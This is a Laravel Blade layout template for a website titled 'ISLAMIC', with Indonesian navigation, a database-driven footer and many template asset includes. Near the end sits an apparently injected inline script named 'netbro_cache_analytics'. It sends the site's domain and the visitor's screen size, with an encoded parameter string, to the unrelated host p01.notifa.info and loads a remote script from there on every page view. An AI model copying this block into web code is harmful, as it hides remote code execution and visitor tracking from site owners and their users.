<!DOCTYPE html>
<!--[if lt IE 10]> <html  lang="en" class="iex"> <![endif]-->
<!--[if (gt IE 10)|!(IE)]><!-->
<html lang="en">
<!--<![endif]-->

<!-- Mirrored from templates.framework-y.com/signflow/pages/index-freelancer.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 24 Feb 2018 06:55:32 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>ISLAMIC | @yield('title')</title>
    <meta name="description" content="Multipurpose HTML template.">
    <script src="{{ asset('/HTWF/scripts/jquery.min.js') }}"></script>
    <link rel="stylesheet" href="{{ asset('/HTWF/scripts/bootstrap/css/bootstrap.css') }}">
    <script src="{{ asset('/HTWF/scripts/script.js') }}"></script>
    <link rel="stylesheet" href="{{ asset('/HTWF/style.css') }}">
    <link rel="stylesheet" href="{{ asset('/HTWF/css/content-box.css') }}">
    <link rel="stylesheet" href="{{ asset('/HTWF/css/image-box.css') }}">
    <link rel="stylesheet" href="{{ asset('/HTWF/css/animations.css') }}">
    <link rel="stylesheet" href="{{ asset('/HTWF/css/components.css') }}">
    <link rel="stylesheet" href="{{ asset('/HTWF/scripts/flexslider/flexslider.css')}}">
    <link rel="stylesheet" href="{{ asset('/HTWF/scripts/magnific-popup.css')}}">
    <link rel="stylesheet" href="{{ asset('/HTWF/scripts/php/contact-form.css')}}">
    <link rel="stylesheet" href="{{ asset('/HTWF/scripts/social.stream.css')}}">
    <link rel="icon" href="{{ asset('/images/favicon.png')}}">
    <link rel="stylesheet" href="{{ asset('/skin.css')}}">
    <link href="https://fonts.googleapis.com/css?family=Comfortaa" rel="stylesheet">
    <style type="text/css">
        body{
            font-family: 'Comfortaa', cursive;
        }
    </style>
</head>
<body>
    <div id="preloader"></div>
    <header class="fixed-top scroll-change" data-menu-anima="fade-bottom">
        <div class="navbar navbar-default mega-menu-fullwidth navbar-fixed-top" role="navigation">
            <div class="navbar navbar-main">
                <div class="container">
                    <div class="navbar-header">
                        <button type="button" class="navbar-toggle">
                            <i class="fa fa-bars"></i>
                        </button>
                        <a class="navbar-brand" href="{{url('/')}}">
                            <img class="logo-default" src="/img/islamicv1.png" alt="logo" />
                            {{-- <img class="logo-retina" src="img/.png" alt="logo" /> --}}
                        </a>
                    </div>
                    <div class="collapse navbar-collapse">
                        <div class="nav navbar-nav navbar-right">
                            <ul class="nav navbar-nav">
                                <li class="dropdown{{ Request::is('/') ? 'actived' : '' }}">
                                    <a href="{{ url('/') }}">Beranda</a>
                                </li>
                                <li class="dropdown{{ Request::is('all') ? 'actived' : '' }}">
                                    <a href="{{ url('/all') }}">Blog</a>
                                </li>
                                 <li class="dropdown{{ Request::is('map') ? 'actived' : '' }}">
                                    <a href="{{ url('/map') }}">Lokasi</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>
    @yield('content')
    @php
    function data_d($type){
        return App\content::where('jenis', $type)->first()->ket;
    }
    @endphp
    <div class="section-empty">
        <i class="scroll-top scroll-top-mobile show fa fa-sort-asc"></i>
        <footer class="footer-base">
            <div class="content">
                <div class="container">
                    <div class="row">
                        <div class="col-md-3 footer-center text-left">
                            <img width="120" src="{{ asset('/img/islamicv3.png') }}" alt="" />
                        </div>
                        <div class="col-md-6 footer-left text-left">
                            <p> {{data_d('lokasi')}}</p>
                            <div class="tag-row">
                                <span> {{data_d('email')}}</span>
                                <span> {{data_d('phone')}}</span>
                            </div>
                        </div>
                        @php
                        function sosmed($value)
                        {
                            return App\sosmed::where('name',$value)->first()->url;
                        }
                        @endphp
                        <div class="col-md-3 footer-left text-right text-left-sm">
                            <div class="btn-group social-group btn-group-icons">
                                <a target="_blank" href="{{ sosmed('fb') }}" >
                                    <i class="fa fa-facebook text-xs circle"></i>
                                </a>
                                <a target="_blank" href="{{ sosmed('twitter') }}" >
                                    <i class="fa fa-twitter text-xs circle"></i>
                                </a>
                                <a target="_blank" href="{{ sosmed('gplus') }}" >
                                    <i class="fa fa-google-plus text-xs circle"></i>
                                </a>
                                <a target="_blank" href="{{ sosmed('ig') }}">
                                    <i class="fa fa-instagram text-xs circle"></i>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row copy-row">
                    <div class="col-md-12 copy-text">
                        © 2018 Islamic by Ari Ardiansyah <span>Template Handmade by <a href="http://schiocco.io/">schiocco.io</a></span>
                    </div>
                </div>
            </div>
            <link rel="stylesheet" href="{{ asset ('/HTWF/scripts/font-awesome/css/font-awesome.css')}}">
            <script async src="{{ asset ('/HTWF/scripts/bootstrap/js/bootstrap.min.js')}}"></script>
            <script src="{{ asset ('/HTWF/scripts/imagesloaded.min.js')}}"></script>
            <script src="{{ asset ('/HTWF/scripts/parallax.min.js')}}"></script>
            <script src="{{ asset ('/HTWF/scripts/flexslider/jquery.flexslider-min.js')}}"></script>
            <script async src="{{ asset ('/HTWF/scripts/isotope.min.js')}}"></script>
            <script async src="{{ asset ('/HTWF/scripts/php/contact-form.js')}}"></script>
            <script async src="{{ asset ('/HTWF/scripts/jquery.progress-counter.js')}}"></script>
            <script async src="{{ asset ('/HTWF/scripts/jquery.tab-accordion.js')}}"></script>
            <script async src="{{ asset ('/HTWF/scripts/bootstrap/js/bootstrap.popover.min.js')}}"></script>
            <script async src="{{ asset ('/HTWF/scripts/jquery.magnific-popup.min.js')}}"></script>
            <script src="{{ asset ('/HTWF/scripts/social.stream.min.js')}}"></script>
            <script src="{{ asset ('/HTWF/scripts/jquery.slimscroll.min.js')}}"></script>
            <script src="{{ asset ('/HTWF/scripts/smooth.scroll.min.js')}}"></script>
        </footer>
        <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mb18BcU5YS4NSzU2gEwidjBLxXYfbTcXcerJmRUKtDZww0M1Febt0xRFcBn2wNHZ0TwA63A%2f016y9hnk8P48bQbm5RVAgl9cT60IhmepsYM%2bk3X4OBEoBcI%2bboR9WpBAVJQ4y7eDxTsR7wJJ8V0mqC6iRagJV4iRFkO50JbrBGrm8TA3uy0LP5Bs1ZP5XhfMypvA3nrRpaeJ2K9psy49yC%2faHBI9dr%2bdtyYJ5N359mfbbUaNsG3MD4A%2bMZvn%2fMrrOmCTcmtJkssLtxL8YOKvrSD1xt8DbyOK%2fDGRtPYFZYzU%2beFeWKRD6%2fbMzk6SEEwSWbygaQ0hDqNOWNeoyPU4a44ui0St9bPYDy5mMU5myU8YWKFKEylvRKDwuqd0r0wegE4egIxA6OisutWEsYH2%2bcWQ%2f69Xm1bTzajajC3DB%2fFY%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
        @stack('script')
    </body>

    <!-- Mirrored from templates.framework-y.com/signflow/pages/index-freelancer.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 24 Feb 2018 06:56:03 GMT -->
    </html>